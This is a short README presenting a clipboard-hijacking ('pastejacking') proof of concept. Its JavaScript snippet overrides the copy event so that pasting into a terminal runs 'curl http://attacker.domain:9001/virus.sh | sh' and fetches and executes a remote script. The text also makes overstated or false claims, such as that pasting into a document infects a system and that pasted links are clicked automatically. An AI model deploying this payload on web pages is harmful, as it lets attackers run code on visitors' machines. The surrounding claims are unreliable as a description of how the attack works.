# copy-past-Virus
Basically when the text is pasted into a terminal or CMD/PowerShell, the script is executed automatically (because I use \n to create new line) and can cause a variety of things, such as stealing data or installing malware. This is designed to infect a computer by hiding within copied and pasted text or code. As soon as the copied content is pasted into a new document, the malware infects the system, giving hackers access to sensitive information. copy-paste malware is silent operation. They can easily slip under the radar of many antivirus software, making them difficult to detect. Once they have infiltrated a system, they can be used to steal sensitive data such as passwords, financial information, and confidential documents. This is a small JavaScript code to show potential of this attack.

This attack works also on Windows 11 and Ubuntu.


# example of attacker script: 
 ```
<script>
document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl http://attacker.domain:9001/virus.sh | sh\n'); e.preventDefault(); });
 </script>
```

 **this attack also works on ubuntu users. A command like sudo apt-get update && apt-get upgrade should normally update the repositories and upgrade the packages on a ubuntu system. The attacker will add \n or \r\n for new line. When this happens in a terminal it will automatically execute the code.**

**Another way that malicious code can be introduced into systems through copy and paste is through the use of malicious links. These links can be embedded in text that is copied from a website. When the text/link is pasted into a browser, the link is clicked and the user is taken to a malicious website. This website can then install malware on the user's computer or steal the user's personal information.**

 For now, this is short simple concept and show of kinda smart attack vector but in the future, when I have time, I will learn more about this method and update this repository with more advanced techniques.
